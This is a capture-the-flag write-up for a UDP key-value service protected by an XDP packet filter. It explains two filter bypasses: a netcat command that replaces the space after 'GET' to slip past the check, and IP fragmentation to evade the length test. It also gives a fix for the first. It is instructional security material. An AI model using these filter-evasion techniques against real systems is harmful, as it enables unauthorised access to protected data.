# Writeup for the FW service from HITB SECCONF EDU CTF 2021

## About the service

The service is a key-value storage with additional security layer, added by separate service (protector).

UDP protocol is used.

## Structure of the service

Service has two parts:
- storage daemon,
- protector daemon.

Storage daemon (`storage.py`) listens UDP port 17777 and supports commands:
- `PIN` - health-check, the service responds `PON`,
- `PUT <FLAG_ID> <FLAG_DATA> <SIGNATURE>` - the service checks signature and if it is valid, stores the flag, such signature can create only checksystem,
- `GET <FLAG_ID>` - the service returns `<FLAG_DATA>`
- `DIR` - the service returns flags list.

Only last 30 flags are stored, older ones are automatically removed.

Protector daemon (`protector.py`) listens UDP port 17778 and supports single command:
- `LCK <FLAG_ID> <PASS> <SIGNATURE>` - creates protection rule for flag `<FLAG_ID>`.

`<PASS>` is a 4-byte number in hex format. It should be inserted in an optional IP header. If `<PASS>` exists in packet, it is passed to the operating system and storage daemon. Otherwise packet is dropped.

Protector daemon manages an XDP program on a network interface. XDP program allows filtering incoming network packets on a very low level, just after network card. On each `LCK` command program is updated, compiled and loaded to the kernel.

## Vulnerabilities

1. XDP program filters only `GET` commands, others are alowed without password:
```
    if (udp_data[0] != 'G' || udp_data[1] != 'E' || udp_data[2] != 'T' || udp_data[3] != ' ') {
        return XDP_PASS; // Only "GET" commands are protected, others just pass.
    }
```
Here we see that space after command is mandatory.

In storage service, character number 3 of UDP payload is ignored (can be arbitrary):
```
            cmd = message[:3]
            ...
            elif cmd == "GET":
                flag_id = message[4:18]
```
So, if we replace ' ' with other character, XDP program will just pass it.

Exploit:
```
$ echo "GET aaaa-bbbb-7000" | nc -u <IP> 17777; echo
^C
# packet is blocked, no flag is printed

$ echo "GET+aaaa-bbbb-7000" | nc -u <IP> 17777; echo
TEENHYW8LJHU1ZCA818AEA513189ECD=
# flag is printed
```

To fix it, we should remove `udp_data[3] != ' '` condition from `xdp_filter.template.c`.

2. IP packet fragmentation also allows to get around password check.

Vulnerable code is:
```
    if (udp_data + 4 > data_end) {
        return XDP_PASS; // Packet doesn't contain "GET " - not our application (e.g., DNS?)
    }
```

So, if we fragment one UDP packet...
```
[IP header][UDP header][GET <FLAG_ID>]
```
... into smaller ones:
```
[IP header][UDP header]   # IP packet 1
[IP header][GET ]         # IP packet 2
[IP header][<FLAG_ID>]    # IP packet 3
```
they will successfully pass XDP checks. Afterwards, they will be assembled by the operating sytem's network stack, and passed to storage service as one UDP packet.

This exploit can be found at [sploits/fw](../../sploits/fw).
